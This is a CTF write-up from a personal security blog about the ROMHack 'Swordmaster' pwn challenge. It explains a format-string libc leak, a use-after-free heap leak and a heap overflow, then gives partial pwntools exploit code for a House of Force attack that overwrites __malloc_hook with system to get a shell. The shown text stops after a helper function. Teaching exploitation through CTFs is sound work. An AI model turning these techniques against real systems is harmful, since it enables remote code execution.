<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge" /><meta name="author" content="Jack Maginnes (stigward)" /><meta property="og:locale" content="en" /><meta name="description" content="Swordmaster Pwn Challenge" /><meta property="og:description" content="Swordmaster Pwn Challenge" /><link rel="canonical" href="https://stigward.github.io/posts/swordmaster-pwn-chal/" /><meta property="og:url" content="https://stigward.github.io/posts/swordmaster-pwn-chal/" /><meta property="og:site_name" content="Stigward’s Security Journal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-25T21:33:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge" /><meta name="twitter:site" content="@_stigward" /><meta name="twitter:creator" content="@_stigward" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jack Maginnes (stigward)","url":"https://github.com/stigward/"},"dateModified":"2022-09-27T13:57:21-06:00","datePublished":"2022-09-25T21:33:00-06:00","description":"Swordmaster Pwn Challenge","headline":"UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://stigward.github.io/posts/swordmaster-pwn-chal/"},"url":"https://stigward.github.io/posts/swordmaster-pwn-chal/"}</script><title>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge | Stigward's Security Journal</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/new_favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/new_favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/new_favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/new_favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/new_favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stigward's Security Journal"><meta name="application-name" content="Stigward's Security Journal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/new_favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/profile.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stigward's Security Journal</a></div><div class="site-subtitle font-italic">Bug Creator and Exploiter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/stigward" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_stigward" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['stigward.research','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1664163180" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 25, 2022 </em> </span> <span> Updated <em class="" data-ts="1664308641" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 27, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/stigward/">Jack Maginnes (stigward)</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2486 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h1 id="swordmaster-pwn-challenge">Swordmaster Pwn Challenge</h1><h2 id="overview"><span class="mr-2">Overview:</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadly not one of them, but did end up solving it Sunday night, a few hours after the CTF had concluded.</p><p>For this challenge, the binary, <code class="language-plaintext highlighter-rouge">libc.so.6</code> and <code class="language-plaintext highlighter-rouge">ld-linux-x86-64.so.2</code> were provided.</p><h2 id="tldr"><span class="mr-2">TL;DR:</span><a href="#tldr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Getting the flag for this challenge requires the exploitation of 3 bugs. First, we can leak the base address of <code class="language-plaintext highlighter-rouge">libc</code> with a format string vulnerability. Next, we can obtain the base address of the heap with a Use-After-Free (UAF) vulnerability. Finally, we can corrupt the top chunk of the heap’s metadata, allowing us to execute a “House Of Force” attack, overwriting <code class="language-plaintext highlighter-rouge">__malloc_hook</code> with <code class="language-plaintext highlighter-rouge">system</code> and obtaining a shell.</p><h2 id="recon---functionality-and-re"><span class="mr-2">Recon - Functionality and RE:</span><a href="#recon---functionality-and-re" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="binary-walkthrough"><span class="mr-2">Binary Walkthrough:</span><a href="#binary-walkthrough" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When we first run the challenge binary, we are asked to input our name and choose our class. After that, we are shown the menu, where we can conduct a number of actions. <img data-src="/assets/img/img_swordmaster/binary_startup_and_menu.png" alt="startup menu" data-proofer-ignore> We will talk about each menu option and it’s underlying implementation as it becomes relevant to exploitation. For now, let’s jump into Ghidra and see if we can find any vulnerabilities.</p><h3 id="reversing"><span class="mr-2">Reversing:</span><a href="#reversing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="player-struct"><span class="mr-2">Player struct</span><a href="#player-struct" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Jumping into <code class="language-plaintext highlighter-rouge">main</code>, we first see that there is a global <code class="language-plaintext highlighter-rouge">player</code> structure. The program mallocs space for the player’s name and class.</p><p><img data-src="/assets/img/img_swordmaster/read_player_name.png" alt="read name" data-proofer-ignore></p><p>Here we see the program reads <code class="language-plaintext highlighter-rouge">0x1f</code> bytes from <code class="language-plaintext highlighter-rouge">stdin</code> and assigns them to the first field in the player structure. Next, it takes in an integer and compares it in a big conditional statement.</p><p><img data-src="/assets/img/img_swordmaster/setting_player_class.png" alt="set class" data-proofer-ignore></p><p>I have included the <code class="language-plaintext highlighter-rouge">if</code> statement for if a player chooses the number 2. We can see it prints that the mage class was chosen and then writes “Mage” to the other field in the player object which was previously malloc’d. After the conditional block for the chosen class is completed, the <code class="language-plaintext highlighter-rouge">player_init</code> function is run with the player structure passed in as a parameter. I have gone ahead and renamed the fields for easy of readability:</p><p><img data-src="/assets/img/img_swordmaster/player_struct.png" alt="player struct" data-proofer-ignore></p><p>So, with this, we can assume that the global player struct looks something like the following:</p><pre><code class="language-C">struct Player {
	char *name;
	int level;
	int gold;
	int attack;
	int dex; 
	int hp;
	char *class;
}
</code></pre><p>This can be confirmed by observing the player structure (named <code class="language-plaintext highlighter-rouge">pl</code>) in gdb after <code class="language-plaintext highlighter-rouge">player_init</code> is run:</p><p><img data-src="/assets/img/img_swordmaster/player_struct_in_mem.png" alt="player struct" data-proofer-ignore> If we translate this memory layout to the struct above will get a player with a name stored at <code class="language-plaintext highlighter-rouge">0x0000555555605270</code>, a level of 1, 69 (0x45) gold, 10 (0xa) attack, 20 (0x14) dex, 100 (0x64) hp, and a class string stored at <code class="language-plaintext highlighter-rouge">0x00005555556052a0</code>. Running <code class="language-plaintext highlighter-rouge">heap chunks</code>, we can see our name and class name on the heap at the expected memory addresses: <img data-src="/assets/img/img_swordmaster/heap_chunks_init.png" alt="heap init" data-proofer-ignore></p><h4 id="menu-handler"><span class="mr-2">Menu Handler:</span><a href="#menu-handler" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Now that we know how the player struct is stored in memory, let’s take a look at the handler for the binary’s game menu.</p><p><img data-src="/assets/img/img_swordmaster/menu_switch.png" alt="menu switch" data-proofer-ignore> The program first checks to see if we still have enough remaining energy to execute. If our energy is out, the program returns. If we still have energy, the menu options are handled in a large switch statement based on the user input. We will talk more about each handler function as they become relevant to exploiting the challenge.</p><h3 id="memory-protections-and-libc"><span class="mr-2">Memory Protections and Libc:</span><a href="#memory-protections-and-libc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Running <code class="language-plaintext highlighter-rouge">checksec</code>, we can see what memory protections the binary has in place..spoiler alert, it’s basically all of them</p><p><img data-src="/assets/img/img_swordmaster/check_sec.png" alt="checksec" data-proofer-ignore></p><p>With Stack Canaries, NX, and PIE it’s unlikely we will be able to exploit a stack based vulnerability. Furthermore, full RELO makes the entire GOT read only, so we can’t use an arbitrary write to overwrite a GOT address. This means we will likely be dealing with a heap based attack. Taking a look at the <code class="language-plaintext highlighter-rouge">libc</code> provided, we can see it is version 2.27</p><p><img data-src="/assets/img/img_swordmaster/glibc_version_running.png" alt="version glibc" data-proofer-ignore></p><p>We can refer to the following chart (source: https://hackmag.com/coding/htb-ropetwo-uaf/) for valid heap based attacks by version of glibc:</p><p><img data-src="/assets/img/img_swordmaster/glibc_version.png" alt="glibc verison" data-proofer-ignore></p><h2 id="vulnerabilities"><span class="mr-2">Vulnerabilities:</span><a href="#vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we understand how the binary works, it’s time to discuss the vulnerabilities.</p><h3 id="use-after-free"><span class="mr-2">Use-After-Free:</span><a href="#use-after-free" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The Use-after-free vuln was the first one I located, based strictly on the functionality of the binary. When we choose option 5 in the menu, we get a message stating <code class="language-plaintext highlighter-rouge">[!] Old class has been deleted and your stats will change! Feel free to choose another class!</code>. Taking a look at the <code class="language-plaintext highlighter-rouge">change_class</code> handler function below, we can confirm that first, <code class="language-plaintext highlighter-rouge">player-&gt;class</code> is assigned to a newly malloc’d pointer, and then that pointer is free’d.</p><p><img data-src="/assets/img/img_swordmaster/uaf_static.png" alt="uaf static" data-proofer-ignore></p><p>However, we know that menu option 3, “Show stats”, will read from the class pointer in the player struct. So what happens if we run option 3 after option 5?</p><p><img data-src="/assets/img/img_swordmaster/UAF_in_class.png" alt="uaf shown" data-proofer-ignore></p><p>As shown above, our “Class” now seems to contain garbage data instead of “Mage”. Taking a look at program memory, we can see the player’s class pointer points to <code class="language-plaintext highlighter-rouge">0x555555605300</code>, which after being free’d now contains two little-endian hex values: <code class="language-plaintext highlighter-rouge">0x5555556052d0</code> and <code class="language-plaintext highlighter-rouge">0x555555604010</code>.</p><p><img data-src="/assets/img/img_swordmaster/heap_struct_uaf.png" alt="heap struct" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>The free’d chunks still show up in the heap chunks because of the tcache. Future posts will go into further details on the glibc internals.</p></div></blockquote><p>You may notice that these hex values are the address of the previous chunk and the address of the first chunk respectively, thus leaking the address of the heap. I spent a while on this bug seeing if there was any way to weaponize it more, but the leak is the only primative it gives us. This will be helpful to bypass ASLR, but we will need another bug (or two) in order to craft an exploit.</p><h3 id="heap-metadata-corruption"><span class="mr-2">Heap Metadata Corruption:</span><a href="#heap-metadata-corruption" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Our second bug is in the binary’s “Craft Sword” functionality, which is option 1 in the game menu.</p><p><img data-src="/assets/img/img_swordmaster/sword_handler.png" alt="sword handler" data-proofer-ignore></p><p>As shown above, the program reads our input and malloc’s that size, allowing us the ability to malloc arbitrary sizes through normal program interaction. Next, it asks us to input a 1, 2, or 3 to choose what we want to “empower our sword” with. However, notice that instead of using the <code class="language-plaintext highlighter-rouge">read_num()</code> function, a standard <code class="language-plaintext highlighter-rouge">read</code> is used. This means we can specify any data, and it will be read to our newly malloc’d memory. Furthermore, you will notice that <code class="language-plaintext highlighter-rouge">read</code> will actually read up to <code class="language-plaintext highlighter-rouge">__size + 8</code> data into our <code class="language-plaintext highlighter-rouge">__buf</code> pointer, meaning there is a 7-byte heap based buffer overflow. We can confirm this by providing a size for malloc, and then a data payload that is 7 bytes longer than the specified size.</p><p><img data-src="/assets/img/img_swordmaster/heap_based_buffer_overflow.png" alt="BoF" data-proofer-ignore></p><p>Now, observing our heap we see the following:</p><p><img data-src="/assets/img/img_swordmaster/top_chunk_overwrite_mem.png" alt="top chunk overwrite" data-proofer-ignore></p><p>We can see that our 7 byte overwrite affects the size of the top chunk in our program. Nice! This indicates we may be able to execute a <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force">House Of Force</a> attack. Normally, the top chunk’s size is the heap’s total allocated space minus the already allocated chunk sizes, bordering the end of the heap memory. With the overflow, we can now force malloc to return and thus overwrite arbitrary pointers in memory OUTSIDE of the heap’s memory space. However, due to ASLR, we don’t know where things outside of the heap memory are located, and thus we need another leak…</p><h3 id="format-string"><span class="mr-2">Format String:</span><a href="#format-string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Okay to be honest, this is where I got stuck while the CTF was still running and I felt a little silly afterwards. Thanks to the person in discord who was able to give me a small hint that pushed me in the right direction. Back in our <code class="language-plaintext highlighter-rouge">main</code> function, when we are prompted to pick a class, there is an <code class="language-plaintext highlighter-rouge">else</code> block in the conditional that auto assigns us the <code class="language-plaintext highlighter-rouge">Tank</code> class if our option does not match any of the acceptable options.</p><p><img data-src="/assets/img/img_swordmaster/format_string_static.png" alt="format string" data-proofer-ignore></p><p>As shown above, there conditional starts with three <code class="language-plaintext highlighter-rouge">printf</code> statements which combine to print <code class="language-plaintext highlighter-rouge">"There is no &lt;USER INPUT&gt; class! You will follow the Tank path..."</code>. Notice the second <code class="language-plaintext highlighter-rouge">printf</code> puts our user input directly into the function, resulting in a classic <a href="https://owasp.org/www-community/attacks/Format_string_attack">format string vulnerability</a>. Taking a look at how <code class="language-plaintext highlighter-rouge">menu_choice_2</code> is set, we see that we are constrained to 6 characters:</p><p><img data-src="/assets/img/img_swordmaster/menu_choice.png" alt="menu choices" data-proofer-ignore></p><p>We can leverage this vulnerability to leak variables from the stack. Lets use <code class="language-plaintext highlighter-rouge">%p</code> as our payload and set a break point right before the 2nd print (<code class="language-plaintext highlighter-rouge">main+521</code>) function call. We are trying to leak an address from libc, so we also need to find where libc is loaded. We can do so with <code class="language-plaintext highlighter-rouge">info proc mappings</code>. This results in the following:</p><p><img data-src="/assets/img/img_swordmaster/info_proc.png" alt="info proc" data-proofer-ignore></p><p>We can see the base address for <code class="language-plaintext highlighter-rouge">libc</code> is <code class="language-plaintext highlighter-rouge">0x7ffff79e2000</code>. This will change on each run (outside of GDB) due to ASLR as described earlier.</p><p>Dumping the stack with <code class="language-plaintext highlighter-rouge">x/50gx $rsp</code>, we can see there is one stack variable which is a pointer to somewhere in <code class="language-plaintext highlighter-rouge">libc</code>’s memory range.</p><p><img data-src="/assets/img/img_swordmaster/libc_stack.png" alt="libc stack val" data-proofer-ignore></p><p>Through a fairly boring and far-too-long manual process, I was able to determine the proper offset to leak this variable was 13.</p><p><img data-src="/assets/img/img_swordmaster/proper_address_leaked.png" alt="libc leak" data-proofer-ignore></p><p>Then to determine our base address, we need to subtract <code class="language-plaintext highlighter-rouge">0x21c87</code>:</p><p><code class="language-plaintext highlighter-rouge">0x00007ffff7a03c87 - 0x21c87 = 0x7ffff79e2000 = libc base</code></p><p>Nice, we now have everything we need to write an exploit!</p><h2 id="exploit"><span class="mr-2">Exploit:</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When doing research on House of Force, I found a <a href="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/">fantastic write-up</a> by Adam Force that explains a basic strategy to get RCE. The idea is to overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, a function called before each malloc, with <code class="language-plaintext highlighter-rouge">system</code>, and pass it a pointer to <code class="language-plaintext highlighter-rouge">/bin/sh\0</code>. Therefore, our exploit will work as follows.</p><ol><li>Set our name to <code class="language-plaintext highlighter-rouge">/bin/sh\0</code>, which will be stored on the heap at an address we know through our leaks<li>Trigger the format string vuln to leak libc base<li>Choose menu option 5 to trigger the UAF vuln and then choose option 3 to leak the heap address<li>Use the craft sword function to corrupt the top chunk size<li>Use the craft sword function to allocate a chunk up to the address of <code class="language-plaintext highlighter-rouge">__malloc_hook</code><li>Use the craft sword function to create chunk to overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code> with the <code class="language-plaintext highlighter-rouge">system</code> address<li>Call craft sword one last time with a pointer to the name in our player object to get a shell.</ol><h3 id="step-one"><span class="mr-2">Step One:</span><a href="#step-one" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will use pwntools for this exploit. First we need to set up the binary to run with the provided <code class="language-plaintext highlighter-rouge">glibc</code> and then send it our name.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./swordmaster"</span><span class="p">)</span>  
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./glibc/libc.so.6"</span><span class="p">)</span>  
<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">'./glibc/ld-linux-x86-64.so.2'</span><span class="p">,</span><span class="s">'./swordmaster'</span><span class="p">],</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD\_PRELOAD"</span><span class="p">:</span><span class="s">"./glibc/libc.so.6"</span><span class="p">})</span>  
  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
</pre></table></code></div></div><h3 id="step-two"><span class="mr-2">Step Two:</span><a href="#step-two" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Next, we need to leak the libc address with the format string vulnerability. We can do so by waiting for the text prompt, sending <code class="language-plaintext highlighter-rouge">%13$p</code> as our class, and then parsing the address out of the received line. Lastly, we subtract <code class="language-plaintext highlighter-rouge">0x21c87</code> as described above and set <code class="language-plaintext highlighter-rouge">libc.address</code> accordingly. <code class="language-plaintext highlighter-rouge">pwntools</code> now knows the base address of libc and can load it’s symbols at the proper addresses.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'%13$p'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'There is no '</span><span class="p">)</span>  
  
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  
<span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>  
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x21c87</span>
</pre></table></code></div></div><h3 id="step-3"><span class="mr-2">Step 3:</span><a href="#step-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Similar to the above step, we need to interact with the program to exploit the UAF bug and get our heap base address. We do so by sending <code class="language-plaintext highlighter-rouge">5</code> to delete our player’s class, and then sending <code class="language-plaintext highlighter-rouge">3</code> to display our stats. We can parse the received line and grab the leaked hex value, which we know from our previous recon will be the value of the previously allocated chunk. At this point in the program, the heap layout will always be the same, so we can use a static offset to get back to the heap base.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Class: '</span><span class="p">)</span>  
  
<span class="n">heap</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4800</span> <span class="o">-</span> <span class="mh">0x10</span>
</pre></table></code></div></div><h3 id="step-4"><span class="mr-2">Step 4:</span><a href="#step-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now it’s time to start the heap exploitation process. To make matters simpler, we can write a wrapper around the craft sword program interaction.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
